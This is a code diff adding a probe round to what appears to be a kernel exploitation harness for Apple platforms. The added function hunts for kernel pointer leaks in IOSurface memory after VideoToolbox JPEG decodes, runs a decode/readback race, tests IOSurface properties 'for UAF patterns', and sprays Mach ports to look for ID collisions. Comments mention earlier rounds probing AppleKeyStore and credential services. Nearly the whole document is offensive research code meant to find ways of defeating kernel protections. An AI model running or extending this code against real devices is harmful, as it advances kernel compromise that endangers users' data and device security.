@@ -6152,6 +6152,489 @@ kptr_scan_done:
     fflush(stdout);
 }
 
+/* r320: VT decode callback captures output pixel buffer */
+static CVPixelBufferRef g_decoded_pb = NULL;
+static void vt_decode_callback(void *ctx, void *srcRef, OSStatus status,
+                               VTDecodeInfoFlags flags, CVImageBufferRef ib,
+                               CMTime pts, CMTime dur) {
+    rlog("  [VT callback] status=%d flags=0x%x ib=%p\n", (int)status, (int)flags, ib);
+    if (ib && status == 0) {
+        g_decoded_pb = (CVPixelBufferRef)ib;
+        CVPixelBufferRetain(g_decoded_pb);
+    }
+}
+
+static void r320_probe(void) {
+    rlog("\n=== r320: VT Decode Output Capture + IOSurface HW Path Leak ===\n");
+    rlog("  Strategy: Capture VT decoded frame, inspect IOSurface for HW decoder residue\n\n");
+    fflush(stdout);
+    kern_return_t kr;
+
+    typedef void* (*IOSurfaceCreate_t)(CFDictionaryRef);
+    typedef uint32_t (*IOSurfaceGetID_t)(void*);
+    typedef void* (*IOSurfaceGetBaseAddress_t)(void*);
+    typedef size_t (*IOSurfaceGetAllocSize_t)(void*);
+    typedef uint32_t (*IOSurfaceLock_t)(void*, uint32_t, uint32_t*);
+    typedef uint32_t (*IOSurfaceUnlock_t)(void*, uint32_t, uint32_t*);
+    typedef int (*IOSurfaceGetPropertyCount_t)(void*);
+
+    IOSurfaceCreate_t surfCreate = (IOSurfaceCreate_t)dlsym(RTLD_DEFAULT, "IOSurfaceCreate");
+    IOSurfaceGetID_t surfGetID = (IOSurfaceGetID_t)dlsym(RTLD_DEFAULT, "IOSurfaceGetID");
+    IOSurfaceGetBaseAddress_t surfGetBase = (IOSurfaceGetBaseAddress_t)dlsym(RTLD_DEFAULT, "IOSurfaceGetBaseAddress");
+    IOSurfaceGetAllocSize_t surfGetSize = (IOSurfaceGetAllocSize_t)dlsym(RTLD_DEFAULT, "IOSurfaceGetAllocSize");
+    IOSurfaceLock_t surfLock = (IOSurfaceLock_t)dlsym(RTLD_DEFAULT, "IOSurfaceLock");
+    IOSurfaceUnlock_t surfUnlock = (IOSurfaceUnlock_t)dlsym(RTLD_DEFAULT, "IOSurfaceUnlock");
+
+    /* ---- Part 1: VT JPEG decode with proper callback ---- */
+    rlog("--- Part 1: VT JPEG decode with output callback ---\n");
+    fflush(stdout);
+    {
+        CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
+        CGContextRef ctx = CGBitmapContextCreate(NULL, 64, 64, 8, 64*4,
+            cs, kCGImageAlphaPremultipliedFirst | kCGBitmapByteOrder32Little);
+        if (ctx) {
+            uint8_t *data = (uint8_t *)CGBitmapContextGetData(ctx);
+            for (int i = 0; i < 64*64*4; i++) data[i] = (uint8_t)(i & 0xFF);
+            CGImageRef img = CGBitmapContextCreateImage(ctx);
+            if (img) {
+                CFMutableDataRef jpegData = CFDataCreateMutable(NULL, 0);
+                CGImageDestinationRef dst = CGImageDestinationCreateWithData(jpegData,
+                    CFSTR("public.jpeg"), 1, NULL);
+                if (dst) {
+                    CGImageDestinationAddImage(dst, img, NULL);
+                    CGImageDestinationFinalize(dst);
+                    CFIndex jpegLen = CFDataGetLength(jpegData);
+                    rlog("  JPEG: %ld bytes\n", (long)jpegLen);
+
+                    CMBlockBufferRef blockBuf = NULL;
+                    OSStatus st = CMBlockBufferCreateWithMemoryBlock(NULL,
+                        (void *)CFDataGetBytePtr(jpegData), jpegLen,
+                        kCFAllocatorNull, NULL, 0, jpegLen, 0, &blockBuf);
+
+                    CMVideoFormatDescriptionRef fmtDesc = NULL;
+                    st = CMVideoFormatDescriptionCreate(NULL,
+                        kCMVideoCodecType_JPEG, 64, 64, NULL, &fmtDesc);
+
+                    if (blockBuf && fmtDesc) {
+                        CMSampleBufferRef sampleBuf = NULL;
+                        CMSampleTimingInfo timing = {
+                            .duration = CMTimeMake(1, 30),
+                            .presentationTimeStamp = CMTimeMake(0, 30),
+                            .decodeTimeStamp = kCMTimeInvalid
+                        };
+                        size_t sampleSize = jpegLen;
+                        st = CMSampleBufferCreate(NULL, blockBuf, true,
+                            NULL, NULL, fmtDesc, 1, 1, &timing, 1, &sampleSize,
+                            &sampleBuf);
+
+                        /* Destination attributes: request IOSurface-backed output */
+                        CFMutableDictionaryRef destAttrs = CFDictionaryCreateMutable(NULL, 0,
+                            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                        int pfOut = kCVPixelFormatType_32BGRA;
+                        CFNumberRef pfOutVal = CFNumberCreate(NULL, kCFNumberIntType, &pfOut);
+                        CFDictionarySetValue(destAttrs, kCVPixelBufferPixelFormatTypeKey, pfOutVal);
+                        CFDictionarySetValue(destAttrs, kCVPixelBufferIOSurfacePropertiesKey,
+                            CFDictionaryCreate(NULL, NULL, NULL, 0,
+                                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks));
+
+                        g_decoded_pb = NULL;
+                        VTDecompressionOutputCallbackRecord cb = {
+                            .decompressionOutputCallback = vt_decode_callback,
+                            .decompressionOutputRefCon = NULL
+                        };
+                        VTDecompressionSessionRef vtSess = NULL;
+                        st = VTDecompressionSessionCreate(NULL, fmtDesc,
+                            NULL, destAttrs, &cb, &vtSess);
+                        rlog("  VTSession: st=%d sess=%p\n", (int)st, vtSess);
+
+                        if (vtSess && sampleBuf) {
+                            VTDecodeInfoFlags infoFlags = 0;
+                            st = VTDecompressionSessionDecodeFrame(vtSess, sampleBuf,
+                                kVTDecodeFrame_1xRealTimePlayback, NULL, &infoFlags);
+                            rlog("  Decode: st=%d info=0x%x\n", (int)st, (int)infoFlags);
+
+                            st = VTDecompressionSessionWaitForAsynchronousFrames(vtSess);
+                            rlog("  WaitAsync: st=%d\n", (int)st);
+
+                            if (g_decoded_pb) {
+                                rlog("  Got decoded pixel buffer: %p\n", g_decoded_pb);
+                                CVPixelBufferLockBaseAddress(g_decoded_pb, kCVPixelBufferLock_ReadOnly);
+                                void *pbBase = CVPixelBufferGetBaseAddress(g_decoded_pb);
+                                size_t pbW = CVPixelBufferGetWidth(g_decoded_pb);
+                                size_t pbH = CVPixelBufferGetHeight(g_decoded_pb);
+                                size_t pbBpr = CVPixelBufferGetBytesPerRow(g_decoded_pb);
+                                size_t pbSz = pbBpr * pbH;
+                                rlog("  PB: %zux%zu bpr=%zu base=%p totalSz=%zu\n",
+                                     pbW, pbH, pbBpr, pbBase, pbSz);
+
+                                /* Check for IOSurface backing */
+                                void *iosurf = (void *)CVPixelBufferGetIOSurface(g_decoded_pb);
+                                rlog("  IOSurface backing: %p\n", iosurf);
+                                if (iosurf) {
+                                    uint32_t sid = surfGetID(iosurf);
+                                    size_t allocSz = surfGetSize(iosurf);
+                                    rlog("  IOSurface id=%u allocSz=%zu\n", sid, allocSz);
+
+                                    /* Scan ENTIRE IOSurface alloc for kernel pointers */
+                                    surfLock(iosurf, 1, NULL); /* read-only */
+                                    void *sbase = surfGetBase(iosurf);
+                                    rlog("  IOSurface base=%p\n", sbase);
+                                    if (sbase && allocSz > 0) {
+                                        uint64_t *p = (uint64_t *)sbase;
+                                        size_t nwords = allocSz / 8;
+                                        int kptr = 0;
+                                        for (size_t w = 0; w < nwords; w++) {
+                                            uint64_t v = p[w];
+                                            /* Kernel text: 0xfffffff0XXXXXXXX */
+                                            if ((v >> 28) == 0xfffffff0ULL ||
+                                                (v >> 28) == 0xfffffff1ULL ||
+                                                (v >> 28) == 0xfffffff2ULL) {
+                                                rlog("  !!! KPTR at +0x%zx: 0x%llx !!!\n", w*8, v);
+                                                kptr++;
+                                                if (kptr >= 10) break;
+                                            }
+                                        }
+                                        rlog("  IOSurface kptr scan: %d found in %zu bytes\n",
+                                             kptr, allocSz);
+
+                                        /* Dump first 64 bytes of IOSurface */
+                                        rlog("  IOSurf hex[0..63]:");
+                                        uint8_t *sb = (uint8_t *)sbase;
+                                        for (int i = 0; i < 64 && (size_t)i < allocSz; i++)
+                                            rlog(" %02x", sb[i]);
+                                        rlog("\n");
+
+                                        /* Check padding / metadata area beyond pixel data */
+                                        if (allocSz > pbSz) {
+                                            size_t extra = allocSz - pbSz;
+                                            rlog("  Extra bytes beyond pixel data: %zu\n", extra);
+                                            uint64_t *ep = (uint64_t *)((uint8_t *)sbase + pbSz);
+                                            size_t ewords = extra / 8;
+                                            if (ewords > 128) ewords = 128;
+                                            int ekptr = 0;
+                                            for (size_t w = 0; w < ewords; w++) {
+                                                if (ep[w] != 0) {
+                                                    rlog("  Extra[+0x%zx]: 0x%llx\n",
+                                                         pbSz + w*8, ep[w]);
+                                                    ekptr++;
+                                                    if (ekptr >= 20) break;
+                                                }
+                                            }
+                                        }
+                                    }
+                                    surfUnlock(iosurf, 1, NULL);
+                                }
+
+                                CVPixelBufferUnlockBaseAddress(g_decoded_pb, kCVPixelBufferLock_ReadOnly);
+                                CVPixelBufferRelease(g_decoded_pb);
+                                g_decoded_pb = NULL;
+                            } else {
+                                rlog("  No decoded pixel buffer received\n");
+                            }
+
+                            VTDecompressionSessionInvalidate(vtSess);
+                            CFRelease(vtSess);
+                        }
+                        CFRelease(pfOutVal);
+                        CFRelease(destAttrs);
+                        if (sampleBuf) CFRelease(sampleBuf);
+                    }
+                    if (blockBuf) CFRelease(blockBuf);
+                    if (fmtDesc) CFRelease(fmtDesc);
+                    CFRelease(dst);
+                }
+                CFRelease(jpegData);
+                CGImageRelease(img);
+            }
+            CGContextRelease(ctx);
+        }
+        CGColorSpaceRelease(cs);
+    }
+    fflush(stdout);
+
+    /* ---- Part 2: Multiple VT decode then read-back race ---- */
+    rlog("\n--- Part 2: VT rapid decode + IOSurface readback race ---\n");
+    fflush(stdout);
+    {
+        /* Create src IOSurface with JPEG, decode into it, then immediately
+           remap and scan for stale HW decoder state */
+        int w = 256, h = 256, bpe = 4;
+        CFNumberRef wVal = CFNumberCreate(NULL, kCFNumberIntType, &w);
+        CFNumberRef hVal = CFNumberCreate(NULL, kCFNumberIntType, &h);
+        CFNumberRef bpeVal = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+        int pf = 0x42475241;
+        CFNumberRef pfVal = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+        const void *keys[] = {CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
+                              CFSTR("IOSurfaceBytesPerElement"), CFSTR("IOSurfacePixelFormat")};
+        const void *vals[] = {wVal, hVal, bpeVal, pfVal};
+        CFDictionaryRef props = CFDictionaryCreate(NULL, keys, vals, 4,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+
+        void *raceSurf = surfCreate ? surfCreate(props) : NULL;
+        uint32_t raceID = raceSurf ? surfGetID(raceSurf) : 0;
+        rlog("  Race surface: %p id=%u\n", raceSurf, raceID);
+
+        if (raceSurf) {
+            surfLock(raceSurf, 3, NULL);
+            void *raceBase = surfGetBase(raceSurf);
+            size_t raceAllocSz = surfGetSize(raceSurf);
+            rlog("  base=%p allocSz=%zu\n", raceBase, raceAllocSz);
+
+            /* Fill with sentinel 0xBB */
+            if (raceBase) memset(raceBase, 0xBB, raceAllocSz > 0x40000 ? 0x40000 : raceAllocSz);
+            surfUnlock(raceSurf, 3, NULL);
+
+            /* Create CVPixelBuffer wrapping this IOSurface */
+            CVPixelBufferRef pbWrap = NULL;
+            OSStatus cvst = CVPixelBufferCreateWithIOSurface(NULL, raceSurf, NULL, &pbWrap);
+            rlog("  CVPixelBuffer from IOSurface: st=%d pb=%p\n", (int)cvst, pbWrap);
+
+            if (pbWrap) {
+                /* Create a JPEG and decode multiple times into this surface */
+                CGColorSpaceRef cs2 = CGColorSpaceCreateDeviceRGB();
+                CGContextRef ctx2 = CGBitmapContextCreate(NULL, 256, 256, 8, 256*4,
+                    cs2, kCGImageAlphaPremultipliedFirst | kCGBitmapByteOrder32Little);
+                if (ctx2) {
+                    uint8_t *d = (uint8_t *)CGBitmapContextGetData(ctx2);
+                    for (int i = 0; i < 256*256*4; i++) d[i] = (uint8_t)((i * 7) & 0xFF);
+                    CGImageRef img2 = CGBitmapContextCreateImage(ctx2);
+                    if (img2) {
+                        CFMutableDataRef jd2 = CFDataCreateMutable(NULL, 0);
+                        CGImageDestinationRef jdst = CGImageDestinationCreateWithData(jd2,
+                            CFSTR("public.jpeg"), 1, NULL);
+                        if (jdst) {
+                            CGImageDestinationAddImage(jdst, img2, NULL);
+                            CGImageDestinationFinalize(jdst);
+                            CFIndex jlen = CFDataGetLength(jd2);
+                            rlog("  256x256 JPEG: %ld bytes\n", (long)jlen);
+
+                            CMBlockBufferRef bb = NULL;
+                            CMBlockBufferCreateWithMemoryBlock(NULL,
+                                (void *)CFDataGetBytePtr(jd2), jlen,
+                                kCFAllocatorNull, NULL, 0, jlen, 0, &bb);
+                            CMVideoFormatDescriptionRef fd = NULL;
+                            CMVideoFormatDescriptionCreate(NULL,
+                                kCMVideoCodecType_JPEG, 256, 256, NULL, &fd);
+
+                            if (bb && fd) {
+                                CMSampleBufferRef sb = NULL;
+                                CMSampleTimingInfo tm = {CMTimeMake(1,30), CMTimeMake(0,30), kCMTimeInvalid};
+                                size_t ssz = jlen;
+                                CMSampleBufferCreate(NULL, bb, true, NULL, NULL, fd,
+                                    1, 1, &tm, 1, &ssz, &sb);
+
+                                /* Decode 5 times rapidly */
+                                for (int iter = 0; iter < 5; iter++) {
+                                    g_decoded_pb = NULL;
+                                    VTDecompressionOutputCallbackRecord cb2 = {vt_decode_callback, NULL};
+
+                                    CFMutableDictionaryRef da = CFDictionaryCreateMutable(NULL, 0,
+                                        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                                    int pfO = kCVPixelFormatType_32BGRA;
+                                    CFNumberRef pfOV = CFNumberCreate(NULL, kCFNumberIntType, &pfO);
+                                    CFDictionarySetValue(da, kCVPixelBufferPixelFormatTypeKey, pfOV);
+                                    CFDictionarySetValue(da, kCVPixelBufferIOSurfacePropertiesKey,
+                                        CFDictionaryCreate(NULL, NULL, NULL, 0,
+                                            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks));
+
+                                    VTDecompressionSessionRef vs = NULL;
+                                    VTDecompressionSessionCreate(NULL, fd, NULL, da, &cb2, &vs);
+                                    if (vs && sb) {
+                                        VTDecodeInfoFlags inf = 0;
+                                        VTDecompressionSessionDecodeFrame(vs, sb,
+                                            kVTDecodeFrame_1xRealTimePlayback, NULL, &inf);
+                                        VTDecompressionSessionWaitForAsynchronousFrames(vs);
+
+                                        /* Immediately read back the race surface */
+                                        surfLock(raceSurf, 1, NULL);
+                                        uint8_t *rb = (uint8_t *)surfGetBase(raceSurf);
+                                        int changed = 0;
+                                        if (rb) {
+                                            for (int i = 0; i < 64; i++)
+                                                if (rb[i] != 0xBB) changed++;
+                                        }
+                                        surfUnlock(raceSurf, 1, NULL);
+
+                                        if (g_decoded_pb) {
+                                            void *decSurf = (void *)CVPixelBufferGetIOSurface(g_decoded_pb);
+                                            uint32_t decSurfID = decSurf ? surfGetID(decSurf) : 0;
+                                            rlog("  iter=%d: decoded surfID=%u changed=%d %s\n",
+                                                 iter, decSurfID, changed,
+                                                 decSurfID == raceID ? "SAME SURFACE!" : "different");
+                                            CVPixelBufferRelease(g_decoded_pb);
+                                            g_decoded_pb = NULL;
+                                        } else {
+                                            rlog("  iter=%d: no output, changed=%d\n", iter, changed);
+                                        }
+
+                                        VTDecompressionSessionInvalidate(vs);
+                                        CFRelease(vs);
+                                    }
+                                    CFRelease(pfOV);
+                                    CFRelease(da);
+                                }
+                                if (sb) CFRelease(sb);
+                            }
+                            if (bb) CFRelease(bb);
+                            if (fd) CFRelease(fd);
+                            CFRelease(jdst);
+                        }
+                        CFRelease(jd2);
+                        CGImageRelease(img2);
+                    }
+                    CGContextRelease(ctx2);
+                }
+                CGColorSpaceRelease(cs2);
+                CVPixelBufferRelease(pbWrap);
+            }
+
+            /* Final scan of race surface for any residue */
+            surfLock(raceSurf, 1, NULL);
+            void *finalBase = surfGetBase(raceSurf);
+            if (finalBase) {
+                uint64_t *fp = (uint64_t *)finalBase;
+                size_t nw = (raceAllocSz > 0x40000 ? 0x40000 : raceAllocSz) / 8;
+                int fkptr = 0;
+                for (size_t i = 0; i < nw; i++) {
+                    if ((fp[i] >> 28) == 0xfffffff0ULL) {
+                        rlog("  !!! RACE KPTR at +0x%zx: 0x%llx !!!\n", i*8, fp[i]);
+                        fkptr++;
+                        if (fkptr >= 5) break;
+                    }
+                }
+                rlog("  Final race surface kptr: %d\n", fkptr);
+            }
+            surfUnlock(raceSurf, 1, NULL);
+        }
+
+        CFRelease(props);
+        CFRelease(wVal); CFRelease(hVal); CFRelease(bpeVal); CFRelease(pfVal);
+    }
+    fflush(stdout);
+
+    /* ---- Part 3: IOSurface properties after VT decode ---- */
+    rlog("\n--- Part 3: IOSurface property enumeration post-VT ---\n");
+    fflush(stdout);
+    {
+        /* Check if IOSurfaceCopyAllValues reveals anything */
+        typedef CFDictionaryRef (*IOSurfaceCopyAllValues_t)(void*);
+        typedef void (*IOSurfaceSetValue_t)(void*, CFStringRef, CFTypeRef);
+        typedef CFTypeRef (*IOSurfaceCopyValue_t)(void*, CFStringRef);
+
+        IOSurfaceCopyAllValues_t surfCopyAll = (IOSurfaceCopyAllValues_t)dlsym(RTLD_DEFAULT, "IOSurfaceCopyAllValues");
+        IOSurfaceCopyValue_t surfCopyVal = (IOSurfaceCopyValue_t)dlsym(RTLD_DEFAULT, "IOSurfaceCopyValue");
+        IOSurfaceSetValue_t surfSetVal = (IOSurfaceSetValue_t)dlsym(RTLD_DEFAULT, "IOSurfaceSetValue");
+
+        rlog("  CopyAllValues=%p CopyValue=%p SetValue=%p\n", surfCopyAll, surfCopyVal, surfSetVal);
+
+        /* Create a fresh surface */
+        int w = 32, h = 32, bpe = 4, pf = 0x42475241;
+        CFNumberRef wV = CFNumberCreate(NULL, kCFNumberIntType, &w);
+        CFNumberRef hV = CFNumberCreate(NULL, kCFNumberIntType, &h);
+        CFNumberRef bV = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+        CFNumberRef pV = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+        const void *ks[] = {CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
+                            CFSTR("IOSurfaceBytesPerElement"), CFSTR("IOSurfacePixelFormat")};
+        const void *vs[] = {wV, hV, bV, pV};
+        CFDictionaryRef pr = CFDictionaryCreate(NULL, ks, vs, 4,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        void *testSurf = surfCreate ? surfCreate(pr) : NULL;
+        uint32_t testID = testSurf ? surfGetID(testSurf) : 0;
+        rlog("  Test surface: id=%u\n", testID);
+
+        if (testSurf && surfCopyAll) {
+            CFDictionaryRef allVals = surfCopyAll(testSurf);
+            if (allVals) {
+                CFIndex cnt = CFDictionaryGetCount(allVals);
+                rlog("  All values: %ld keys\n", (long)cnt);
+                CFStringRef *vkeys = (CFStringRef *)malloc(cnt * sizeof(CFStringRef));
+                CFTypeRef *vvals = (CFTypeRef *)malloc(cnt * sizeof(CFTypeRef));
+                CFDictionaryGetKeysAndValues(allVals, (const void **)vkeys, (const void **)vvals);
+                for (CFIndex i = 0; i < cnt && i < 20; i++) {
+                    char kbuf[128] = {0};
+                    CFStringGetCString(vkeys[i], kbuf, sizeof(kbuf), kCFStringEncodingUTF8);
+                    CFTypeID tid = CFGetTypeID(vvals[i]);
+                    if (tid == CFNumberGetTypeID()) {
+                        int64_t nv = 0;
+                        CFNumberGetValue((CFNumberRef)vvals[i], kCFNumberSInt64Type, &nv);
+                        rlog("    %s = %lld (0x%llx)\n", kbuf, nv, (uint64_t)nv);
+                        /* Check for kernel range values */
+                        if (((uint64_t)nv >> 28) == 0xfffffff0ULL)
+                            rlog("    !!! KPTR IN PROPERTY: 0x%llx !!!\n", (uint64_t)nv);
+                    } else {
+                        rlog("    %s (typeID=%lu)\n", kbuf, (unsigned long)tid);
+                    }
+                }
+                free(vkeys);
+                free(vvals);
+                CFRelease(allVals);
+            }
+        }
+
+        /* Try setting a custom value and reading it back — test for UAF patterns */
+        if (testSurf && surfSetVal && surfCopyVal) {
+            CFNumberRef magic = CFNumberCreate(NULL, kCFNumberSInt64Type, &(int64_t){0x4141414141414141LL});
+            surfSetVal(testSurf, CFSTR("CustomMagic"), magic);
+            CFTypeRef readback = surfCopyVal(testSurf, CFSTR("CustomMagic"));
+            if (readback) {
+                int64_t rb = 0;
+                CFNumberGetValue((CFNumberRef)readback, kCFNumberSInt64Type, &rb);
+                rlog("  Custom value readback: 0x%llx %s\n", (uint64_t)rb,
+                     rb == 0x4141414141414141LL ? "MATCH" : "MISMATCH!");
+                CFRelease(readback);
+            }
+            CFRelease(magic);
+        }
+
+        CFRelease(pr); CFRelease(wV); CFRelease(hV); CFRelease(bV); CFRelease(pV);
+    }
+    fflush(stdout);
+
+    /* ---- Part 4: Mach port name spray + IOSurface overlap ---- */
+    rlog("\n--- Part 4: Mach port spray + IOSurface name collision ---\n");
+    fflush(stdout);
+    {
+        /* Spray mach ports, record their names, then create IOSurfaces
+           and check if any IOSurface IDs collide with port names */
+        mach_port_t ports[512];
+        int nports = 0;
+        for (int i = 0; i < 512; i++) {
+            kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &ports[i]);
+            if (kr == 0) nports++;
+            else break;
+        }
+        rlog("  Sprayed %d ports (last=0x%x)\n", nports, nports > 0 ? ports[nports-1] : 0);
+
+        /* Create IOSurfaces and log their IDs */
+        for (int i = 0; i < 5; i++) {
+            int sw = 16, sh = 16, sbpe = 4, spf = 0x42475241;
+            CFNumberRef swV = CFNumberCreate(NULL, kCFNumberIntType, &sw);
+            CFNumberRef shV = CFNumberCreate(NULL, kCFNumberIntType, &sh);
+            CFNumberRef sbV = CFNumberCreate(NULL, kCFNumberIntType, &sbpe);
+            CFNumberRef spV = CFNumberCreate(NULL, kCFNumberIntType, &spf);
+            const void *sk[] = {CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
+                                CFSTR("IOSurfaceBytesPerElement"), CFSTR("IOSurfacePixelFormat")};
+            const void *sv[] = {swV, shV, sbV, spV};
+            CFDictionaryRef sp = CFDictionaryCreate(NULL, sk, sv, 4,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            void *s = surfCreate ? surfCreate(sp) : NULL;
+            if (s) {
+                uint32_t sid = surfGetID(s);
+                rlog("  surf[%d] id=%u (0x%x)\n", i, sid, sid);
+            }
+            CFRelease(sp); CFRelease(swV); CFRelease(shV); CFRelease(sbV); CFRelease(spV);
+        }
+
+        /* Deallocate all ports */
+        for (int i = 0; i < nports; i++)
+            mach_port_deallocate(mach_task_self(), ports[i]);
+    }
+    fflush(stdout);
+
+    rlog("\n=== r320 complete ===\n");
+    fflush(stdout);
+}
+
 static void r317_probe(void) {
     rlog("\n=== r317: Deep AppleKeyStore + AppleJPEGDriver + CredentialManager ===\n\n");
     fflush(stdout);
@@ -36964,6 +37447,13 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 320) {
+            rlog("*** rounds=320: VT Decode Output Capture + IOSurface HW Leak ***\n");
+            rlog("  r319: VT decode st=0, KeyStore all zeros, VM_FLAGS_OVERWRITE works.\n");
+            rlog("  Probe: VT callback capture, IOSurface props, port spray overlap.\n\n");
+            r320_probe();
             goto done;
         }
         if (rounds == 319) {
